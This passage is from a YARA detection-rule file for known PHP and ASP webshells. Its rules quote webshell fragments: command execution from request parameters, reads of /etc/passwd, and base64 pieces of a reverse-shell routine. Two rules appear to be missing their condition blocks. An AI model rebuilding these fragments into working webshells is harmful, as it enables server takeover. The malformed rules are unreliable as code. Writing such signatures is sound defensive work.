		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6589-L6603"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "3fa7e6f3566427196ac47551392e2386a038d61c"
		logic_hash = "5d49f2599781836156f6bbb0c50cfcffdb2ca51c7cb688abbc6245d7f856ad01"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "The requested URL /Nemo/shell/zyklonshell.txt was not found on this server.<P>" fullword
		$s1 = "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">" fullword
		$s2 = "<TITLE>404 Not Found</TITLE>" fullword
		$s3 = "<H1>Not Found</H1>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Myshell_2
{
	meta:
		description = "PHP Webshells Github Archive - file myshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_php_webshells_myshell"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6604-L6619"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5bd52749872d1083e7be076a5e65ffcde210e524"
		logic_hash = "7765e43189d6ec0cda0b58d00cfd7fc8cec89287dbac7487083b6ce1ce55f306"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "if($ok==false &&$status && $autoErrorTrap)system($command . \" 1> /tmp/outpu"
		$s5 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o"
		$s15 = "<title>$MyShellVersion - Access Denied</title>" fullword
		$s16 = "}$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTT"

rule SIGNATURE_BASE_Webshell_Php_Webshells_Lolipop
{
	meta:
		description = "PHP Webshells Github Archive - file lolipop.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6620-L6633"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "86f23baabb90c93465e6851e40104ded5a5164cb"
		logic_hash = "8b0dcf76a244f80d4bee0c62189df55c1f8d71cf0900cd8ebb5916f5fe972bed"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "$commander = $_POST['commander']; " fullword
		$s9 = "$sourcego = $_POST['sourcego']; " fullword
		$s20 = "$result = mysql_query($loli12) or die (mysql_error()); " fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Simple_Cmd
{
	meta:
		description = "PHP Webshells Github Archive - file simple_cmd.php"
		author = "Florian Roth (Nextron Systems)"
		id = "1fd0c01a-c265-5e30-ab36-e8e93e316fbe"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6634-L6648"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "466a8caf03cdebe07aa16ad490e54744f82e32c2"
		logic_hash = "82a65f4bbdcd2fc626aa9f36fe530d19aa19a48389e970c26e525597818914ee"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
		$s2 = "<title>G-Security Webshell</title>" fullword
		$s4 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
		$s6 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Go_Shell
{
	meta:
		description = "PHP Webshells Github Archive - file go-shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "63eaf530-050a-5db7-8885-d4a1e86d62de"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6649-L6664"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "3dd85981bec33de42c04c53d081c230b5fc0e94f"
		logic_hash = "f2fcefb9a0536c80fa74ceb002e113f95de53d1f56e22c81b542c395dd11071d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "#change this password; for power security - delete this file =)" fullword
		$s2 = "if (!defined$param{cmd}){$param{cmd}=\"ls -la\"};" fullword
		$s11 = "open(FILEHANDLE, \"cd $param{dir}&&$param{cmd}|\");" fullword
		$s12 = "print << \"[kalabanga]\";" fullword
		$s13 = "<title>GO.cgi</title>" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Azrailphp_V1_0_2
{
	meta:
		description = "PHP Webshells Github Archive - file aZRaiLPhp v1.0.php"
		author = "Florian Roth (Nextron Systems)"
		id = "10546549-e16d-567d-9d88-3d37fe8ff03f"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_aZRaiLPhp_v1_0"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6665-L6680"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a2c609d1a8c8ba3d706d1d70bef69e63f239782b"
		logic_hash = "8309338bb327cc14ae5970bd921b3dba68353d55be31b9dbbc5374ded24ed563"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<font size='+1'color='#0000FF'>aZRaiLPhP'nin URL'si: http://$HTTP_HOST$RED"
		$s4 = "$fileperm=base_convert($_POST['fileperm'],8,10);" fullword
		$s19 = "touch (\"$path/$dismi\") or die(\"Dosya Olu" fullword
		$s20 = "echo \"<div align=left><a href='./$this_file?dir=$path/$file'>G" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Webshells_Zehir4
{
	meta:
		description = "Webshells Github Archive - file zehir4"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6681-L6694"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "788928ae87551f286d189e163e55410acbb90a64"
		logic_hash = "36b6940ffecd9be190cce62252ec7d87f1c0bc0d19b4442df63f4404eb316364"
		score = 55
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "frames.byZehir.document.execCommand(command, false, option);" fullword
		$s8 = "response.Write \"<title>ZehirIV --> Powered By Zehir &lt;zehirhacker@hotmail.com"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Zehir4_Asp_Php
{
	meta:
		description = "PHP Webshells Github Archive - file zehir4.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "7a849bc6-fff5-5bb6-aff7-660889fd077b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6695-L6708"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "1d9b78b5b14b821139541cc0deb4cbbd994ce157"
		logic_hash = "dfaf685ac3b364143bfbe289b05f066b09f01622fec3e9157f4b4791f7567619"
		score = 75
		quality = 60
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "response.Write \"<title>zehir3 --> powered by zehir &lt;zehirhacker@hotmail.com&"
		$s11 = "frames.byZehir.document.execCommand("
		$s15 = "frames.byZehir.document.execCommand(co"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Ftpsearch
{
	meta:
		description = "PHP Webshells Github Archive - file ftpsearch.php"
		author = "Florian Roth (Nextron Systems)"
		id = "9db8f00a-1843-5057-b8c7-a7f7b63e0659"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6739-L6753"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "c945f597552ccb8c0309ad6d2831c8cabdf4e2d6"
		logic_hash = "6b32553be4fdf26776e3cbb8a5d4d011d88f2bd50949b65934df72b89065aeec"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "echo \"[-] Error : coudn't read /etc/passwd\";" fullword
		$s9 = "@$ftp=ftp_connect('127.0.0.1');" fullword
		$s12 = "echo \"<title>Edited By KingDefacer</title><body>\";" fullword
		$s19 = "echo \"[+] Founded \".sizeof($users).\" entrys in /etc/passwd\\n\";" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell__Cyber_Shell_Cybershell_Cyber_Shell__V_1_0_
{
	meta:
		description = "PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php"
		author = "Florian Roth (Nextron Systems)"
		id = "79146f25-87b9-5216-af88-4e433bb08b90"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6754-L6771"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "fc2cf9a25ccc5aa3d9dc287ef9600b065ba9025cfb0a1ccca1bce9120ea03ff4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "ef7f7c45d26614cea597f2f8e64a85d54630fe38"
		hash1 = "cabf47b96e3b2c46248f075bdbc46197db28a25f"
		hash2 = "9e165d4ed95e0501cd9a90155ac60546eb5b1076"

	strings:
		$s4 = " <a href=\"http://www.cyberlords.net\" target=\"_blank\">Cyber Lords Community</"
		$s10 = "echo \"<meta http-equiv=Refresh content=\\\"0; url=$PHP_SELF?edit=$nameoffile&sh"
		$s11 = " *   Coded by Pixcher" fullword
		$s16 = "<input type=text size=55 name=newfile value=\"$d/newfile.php\">" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell__Ajax_PHP_Command_Shell_Ajax_PHP_Command_Shell_Soldierofallah
{
	meta:
		description = "PHP Webshells Github Archive - from files Ajax_PHP Command Shell.php, Ajax_PHP_Command_Shell.php, soldierofallah.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a158d158-d48d-514c-8b7b-4b6a4a10d021"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6772-L6792"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "0b9e0d96c8a618a4883235e8c5c9a03a1e0b586cb4b30e0273e24c35ee5ee502"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "fa11deaee821ca3de7ad1caafa2a585ee1bc8d82"
		hash1 = "c0a4ba3e834fb63e0a220a43caaf55c654f97429"
		hash2 = "16fa789b20409c1f2ffec74484a30d0491904064"

	strings:
		$s1 = "'Read /etc/passwd' => \"runcommand('etcpasswdfile','GET')\"," fullword
		$s2 = "'Running processes' => \"runcommand('ps -aux','GET')\"," fullword
		$s3 = "$dt = $_POST['filecontent'];" fullword
		$s4 = "'Open ports' => \"runcommand('netstat -an | grep -i listen','GET')\"," fullword
		$s6 = "print \"Sorry, none of the command functions works.\";" fullword
		$s11 = "document.cmdform.command.value='';" fullword
		$s12 = "elseif(isset($_GET['savefile']) && !empty($_POST['filetosave']) && !empty($_POST"

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell__Small_Web_Shell_By_Zaco_Small_Zaco_Zacosmall
{
	meta:
		description = "PHP Webshells Github Archive - from files Small Web Shell by ZaCo.php, small.php, zaco.php, zacosmall.php"
		author = "Florian Roth (Nextron Systems)"
		id = "99dbcea6-7208-5bbe-b200-9ea3074d7855"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6812-L6830"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "840c58043e39014e90e7621c1d2417d5a970c744560738abc4fea3db3cbb8d5a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "b148ead15d34a55771894424ace2a92983351dda"
		hash1 = "e4ba288f6d46dc77b403adf7d411a280601c635b"
		hash2 = "e5713d6d231c844011e9a74175a77e8eb835c856"
		hash3 = "1b836517164c18caf2c92ee2a06c645e26936a0c"

	strings:
		$s2 = "if(!$result2)$dump_file.='#error table '.$rows[0];" fullword
		$s4 = "if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');" fullword
		$s6 = "header('Content-Length: '.strlen($dump_file).\"\\n\");" fullword
		$s20 = "echo('Dump for '.$db_dump.' now in '.$to_file);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell__PH_Vayv_Phvayv_PH_Vayv_Klasvayv_Asp_Php
{
	meta:
		description = "PHP Webshells Github Archive - from files PH Vayv.php, PHVayv.php, PH_Vayv.php, klasvayv.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "1575591b-3245-5c3d-b2a4-6def89e77032"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6851-L6869"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "42959ba1e3c0f7f198f953e98b9df87059999f5526df4338c109828d0a5a518a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "b51962a1ffa460ec793317571fc2f46042fd13ee"
		hash1 = "408ac9ca3d435c0f78bda370b33e84ba25afc357"
		hash2 = "4003ae289e3ae036755976f8d2407c9381ff5653"
		hash3 = "4f83bc2836601225a115b5ad54496428a507a361"

	strings:
		$s1 = "<font color=\"#000000\">Sil</font></a></font></td>" fullword
		$s5 = "<td width=\"122\" height=\"17\" bgcolor=\"#9F9F9F\">" fullword
		$s6 = "onfocus=\"if (this.value == 'Kullan" fullword
		$s16 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif\">"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Generic_PHP_9
{
	meta:
		description = "PHP Webshells Github Archive - from files KAdot Universal Shell v0.1.6.php, KAdot_Universal_Shell_v0.1.6.php, KA_uShell 0.1.6.php"
		author = "Florian Roth (Nextron Systems)"
		id = "98927127-08be-57ac-a090-38c7e614dae7"
		date = "2014-04-06"
		modified = "2022-12-06"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6871-L6891"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "9f8768f609ccd464f7c2b9d10ce8ea423355e11b05b39e629e5e3de0787e212b"
		score = 70
		quality = 77
		tags = ""
		super_rule = 1
		hash0 = "89f2a7007a2cd411e0a7abd2ff5218d212b84d18"
		hash1 = "2266178ad4eb72c2386c0a4d536e5d82bb7ed6a2"
		hash2 = "0daed818cac548324ad0c5905476deef9523ad73"

	strings:
		$ = { 3a 3c 62 3e 22 20 2e 62 61 73 65 36 34 5f 64 65 63 6f 64 65 28 24 5f 50 4f 53 54 5b 27 74 6f 74 27 5d 29 2e 20 22 3c 2f 62 3e 22 3b }
		$ = { 69 66 20 28 69 73 73 65 74 28 24 5f 50 4f 53 54 5b 27 77 71 27 5d 29 20 26 26 20 24 5f 50 4f 53 54 5b 27 77 71 27 5d 3c 3e 22 22 29 20 7b }
		$ = { 70 61 73 73 74 68 72 75 28 24 5f 50 4f 53 54 5b 27 63 27 5d 29 3b }
		$ = { 3c 69 6e 70 75 74 20 74 79 70 65 3d 22 72 61 64 69 6f 22 20 6e 61 6d 65 3d 22 74 61 63 22 20 76 61 6c 75 65 3d 22 31 22 3e 42 36 34 20 44 65 63 6f 64 65 3c 62 72 3e }

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Generic_PHP_1
{
	meta:
		description = "PHP Webshells Github Archive - from files Dive Shell 1.0"
		author = "Florian Roth (Nextron Systems)"
		id = "9a87038b-3f78-5b9a-a209-c9026d83363f"
		date = "2014-04-06"
		modified = "2022-12-06"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6911-L6930"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "9e3759d45d13e33481b962c4b59a019647a3e80bdd3885c4404169af74288b89"
		score = 70
		quality = 79
		tags = ""
		super_rule = 1
		hash0 = "3b086b9b53cf9d25ff0d30b1d41bb2f45c7cda2b"
		hash1 = "2558e728184b8efcdb57cfab918d95b06d45de04"
		hash2 = "203a8021192531d454efbc98a3bbb8cabe09c85c"
		hash3 = "b79709eb7801a28d02919c41cc75ac695884db27"

	strings:
		$ = { 76 61 72 20 63 6f 6d 6d 61 6e 64 5f 68 69 73 74 20 3d 20 6e 65 77 20 41 72 72 61 79 28 3c 3f 70 68 70 20 65 63 68 6f 20 24 6a 73 5f 63 6f 6d 6d 61 6e 64 5f 68 69 73 74 20 3f 3e 29 3b }
		$ = { 69 66 20 28 65 6d 70 74 79 28 24 5f 53 45 53 53 49 4f 4e 5b 27 63 77 64 27 5d 29 20 7c 7c 20 21 65 6d 70 74 79 28 24 5f 52 45 51 55 45 53 54 5b 27 72 65 73 65 74 27 5d 29 29 20 7b }
		$ = { 69 66 20 28 65 2e 6b 65 79 43 6f 64 65 20 3d 3d 20 33 38 20 26 26 20 63 75 72 72 65 6e 74 5f 6c 69 6e 65 20 3c 20 63 6f 6d 6d 61 6e 64 5f 68 69 73 74 2e 6c 65 6e 67 74 68 2d 31 29 20 7b }

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Generic_PHP_2
{
	meta:
		description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, load_shell.php, Loaderz WEB Shell.php, stres.php"
		author = "Florian Roth (Nextron Systems)"
		id = "be335331-34d7-5abc-b29b-eac7a5ec3915"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6932-L6951"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "0a63d3b00ad9719140da9bb5dcb49981c4d3758fac13c392d016b47e54f356c8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
		hash1 = "ca9fcfb50645dc0712abdf18d613ed2196e66241"
		hash2 = "36d8782d749638fdcaeed540d183dd3c8edc6791"
		hash3 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"

	strings:
		$s3 = "if((isset($_POST['fileto']))||(isset($_POST['filefrom'])))" fullword
		$s4 = "\\$port = {$_POST['port']};"
		$s5 = "$_POST['installpath'] = \"temp.pl\";}" fullword

rule SIGNATURE_BASE_Webshell_Generic_PHP_3
{
	meta:
		description = "PHP Webshells Github Archive"
		author = "Florian Roth (Nextron Systems)"
		id = "ff7c6534-efcf-565e-bfc0-1eaa2e9d7b7d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6974-L6993"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "5c264a294fc75cf2cadd3dba61bc64658989ffe5ddecfa18ba18e66492ad3c71"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "d829e87b3ce34460088c7775a60bded64e530cd4"
		hash1 = "d710c95d9f18ec7c76d9349a28dd59c3605c02be"
		hash2 = "f044d44e559af22a1a7f9db72de1206f392b8976"
		hash3 = "41780a3e8c0dc3cbcaa7b4d3c066ae09fb74a289"

	strings:
		$s0 = "header('Content-Length:'.filesize($file).'');" fullword
		$s4 = "<textarea name=\\\"command\\\" rows=\\\"5\\\" cols=\\\"150\\\">\".@$_POST['comma"
		$s7 = "if(filetype($dir . $file)==\"file\")$files[]=$file;" fullword
		$s14 = "elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} " fullword
		$s20 = "$info .= (($perms & 0x0004) ? 'r' : '-');" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_GFS
{
	meta:
		description = "PHP Webshells Github Archive - from files GFS web-shell ver 3.1.7 - PRiV8.php, Predator.php, GFS_web-shell_ver_3.1.7_-_PRiV8.php"
		author = "Florian Roth (Nextron Systems)"
		id = "bde6cfd8-466f-528a-b1e3-f874aa778010"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7018-L7034"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "72a3f117cb11e1461b760c47a3de74283640b6e1daa87b24e45210213bb76609"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "c2f1ef6b11aaec255d4dd31efad18a3869a2a42c"
		hash1 = "34f6640985b07009dbd06cd70983451aa4fe9822"
		hash2 = "d25ef72bdae3b3cb0fc0fdd81cfa58b215812a50"

	strings:
		$s0 = "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==\";" fullword
		$s1 = "lIENPTk47DQpleGl0IDA7DQp9DQp9\";" fullword
		$s2 = "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShm"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell__Crystalshell_V_1_Sosyete_Stres
{
	meta:
		description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, sosyete.php, stres.php"
		author = "Florian Roth (Nextron Systems)"
		id = "774f7f4c-724a-5eb0-b5de-44b389fd593d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7035-L7055"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "78aeabe38f7457060d81c3863098b5e424bc38f13e9e86bbb6ea54827f27afcd"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
		hash1 = "e32405e776e87e45735c187c577d3a4f98a64059"
		hash2 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"

	strings:
		$s1 = "A:visited { COLOR:blue; TEXT-DECORATION: none}" fullword
		$s4 = "A:active {COLOR:blue; TEXT-DECORATION: none}" fullword
		$s11 = "scrollbar-darkshadow-color: #101842;" fullword
		$s15 = "<a bookmark=\"minipanel\">" fullword
		$s16 = "background-color: #EBEAEA;" fullword
		$s18 = "color: #D5ECF9;" fullword
		$s19 = "<center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 border"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Generic_PHP_10
{
	meta:
		description = "PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php, PHPRemoteView.php"
		author = "Florian Roth (Nextron Systems)"
		id = "f52013d6-72ce-544c-a7ef-ae2a2ea87108"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7056-L7076"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "0bf731edef55cde5d2ad16510fb9f1a240c1a06b535af7e13300fdbea470df74"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "ef7f7c45d26614cea597f2f8e64a85d54630fe38"
		hash1 = "cabf47b96e3b2c46248f075bdbc46197db28a25f"
		hash2 = "9e165d4ed95e0501cd9a90155ac60546eb5b1076"
		hash3 = "7d5b54c7cab6b82fb7d131d7bbb989fd53cb1b57"

	strings:
		$s2 = "$world[\"execute\"] = ($world['execute']=='x') ? 't' : 'T'; " fullword
		$s6 = "$owner[\"write\"] = ($mode & 00200) ? 'w' : '-'; " fullword
		$s11 = "$world[\"execute\"] = ($mode & 00001) ? 'x' : '-'; " fullword
		$s12 = "else if( $mode & 0xA000 ) " fullword
		$s17 = "$s=sprintf(\"%1s\", $type); " fullword
		$s20 = "font-size: 8pt;" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell__Findsock_Php_Findsock_Shell_Php_Reverse_Shell
{
	meta:
		description = "PHP Webshells Github Archive - from files findsock.c, php-findsock-shell.php, php-reverse-shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "6567c8f1-bd7f-5844-b937-3db2d8eb7408"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7100-L7114"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "2459f7114482e17f087bda4b638c29e237f2f3cb5a9e41e326ed65fc1834b6be"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
